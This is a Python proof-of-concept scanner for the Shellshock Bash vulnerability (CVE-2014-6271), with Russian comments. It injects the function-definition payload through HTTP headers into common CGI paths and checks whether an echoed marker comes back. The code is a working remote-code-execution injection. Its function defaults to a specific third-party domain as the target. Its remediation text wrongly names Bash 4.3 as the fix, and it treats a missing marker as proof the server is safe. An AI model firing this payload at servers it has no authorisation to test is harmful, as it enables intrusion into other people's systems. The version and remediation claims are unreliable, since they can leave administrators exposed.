```python
"""
CVE-2014-6271 (Shellshock) — критическая уязвимость в командном интерпретаторе
Bash, присутствующая в версиях до 4.3.
Уязвимость позволяет выполнить произвольный код на удалённом сервере
через переменные окружения.
"""

#!/usr/bin/env python3
"""
PoC для CVE-2014-6271 (Shellshock)
Демонстрация уязвимости удалённого выполнения кода в Bash через CGI-скрипты
Только для учебных целей и тестирования собственных систем
"""

import requests
import sys

def check_shellshock(target_url="http://spbik.spb.ru"):
    # Payload для проверки уязвимости:
    # () { :;}; - объявление пустой функции в Bash
    # echo; echo "SHELLSHOCK_TEST" - безопасные команды для проверки
    # Если сервер уязвим, он выполнит команду после точки с запятой
    payload = '() { :;}; echo; echo "SHELLSHOCK_TEST_VULNERABLE"'

    # Типичные пути CGI-скриптов, которые могут быть уязвимы
    cgi_paths = [
        "/cgi-bin/test.cgi",     # Стандартный тестовый скрипт
        "/cgi-bin/status",       # Скрипт статуса сервера
        "/cgi-bin/user.cgi",     # Пользовательский скрипт
        "/cgi-bin/admin.cgi",    # Административный интерфейс
        "/cgi-bin/index.cgi"     # Главная CGI-страница
    ]

    print("Начало проверки Shellshock (CVE-2014-6271)")
    print(f"Целевой сервер: {target_url}")
    print("Описание теста:")
    print("Мы отправляем payload в заголовках User-Agent и Referer")
    print(f"Payload: {payload}\n")

    for path in cgi_paths:
        url = target_url.rstrip('/') + path

        print(f"Тестирование пути: {path}")
        print(f"Полный URL: {url}")

        # Заголовки с payload
        # Веб-сервер передаёт эти заголовки в переменные окружения CGI-скрипта
        headers = {
            'User-Agent': payload,
            'Referer': payload,
            'Cookie': 'test=value'
        }

        try:
            print("Отправка GET-запроса с payload...")
            response = requests.get(url, headers=headers, timeout=5)

            # Анализ ответа сервера
            print(f"Получен ответ:")
            print(f"Код статуса: {response.status_code}")

            if response.status_code == 200:
                print("Сервер ответил 200 OK")

                if "SHELLSHOCK_TEST_VULNERABLE" in response.text:
                    print("ВНИМАНИЕ: Обнаружен тестовый маркер в ответе!")
                    print("Сервер выполнил команду из payload")
                    print(f"Эндпоинт: {url}")
                    print("\n" + "="*50)
                    print("КРИТИЧЕСКАЯ УЯЗВИМОСТЬ ОБНАРУЖЕНА!")
                    print("Сервер уязвим к Shellshock (CVE-2014-6271)")
                    print("="*50)
                    return True
                else:
                    print("Тестовый маркер не найден - возможно не уязвим")
                    print("Причины: CGI не использует Bash или сервер патчен")

            elif response.status_code == 403:
                print("Доступ запрещен (403)")
                print("Сервер блокирует доступ к CGI-скриптам")
                print("Это хорошая практика безопасности")

            elif response.status_code == 404:
                print("Путь не найден (404)")
                print("CGI-скрипт не существует по этому пути")

            elif response.status_code == 500:
                print("Внутренняя ошибка сервера (500)")
                print("Сервер может быть уязвим, но скрипт вызывает ошибку")

            else:
                print(f"Нестандартный код: {response.status_code}")

        except requests.exceptions.ConnectionError:
            print("ОШИБКА ПОДКЛЮЧЕНИЯ")
            print("Сервер недоступен или отклоняет соединение")
            print("Возможные причины: сервер выключен, блокировка firewall")

        except Exception as e:
            print(f"НЕИЗВЕСТНАЯ ОШИБКА: {type(e).__name__}")
            print(f"Подробности: {str(e)[:100]}")

        print()

    return False

if __name__ == "__main__":
    # Тестируем localhost по умолчанию
    target = "http://localhost"
    if len(sys.argv) > 1:
        target = sys.argv[1]
        print(f"Используется целевой URL из аргумента: {target}")
    else:
        print(f"Используется URL по умолчанию: {target}")
        print("Для тестирования другого сервера: python script.py http://example.com")

    print("="*50 + "\n")

    # Запуск проверки
    is_vulnerable = check_shellshock(target)

    # Итоговый вывод
    print("\n" + "="*60)
    print("РЕЗУЛЬТАТЫ ТЕСТИРОВАНИЯ")
    print("="*60)

    if is_vulnerable:
        print("ВЫВОД: Сервер УЯЗВИМ к Shellshock")
        print("Рекомендации по исправлению:")
        print("Обновить Bash до версии 4.3 или выше")
    else:
        print("ВЫВОД: Признаки уязвимости не обнаружены")
        print("Сервер не уязвим (обновлённый Bash)")

    print("\nПроверка завершена. Код выхода: 0")
```
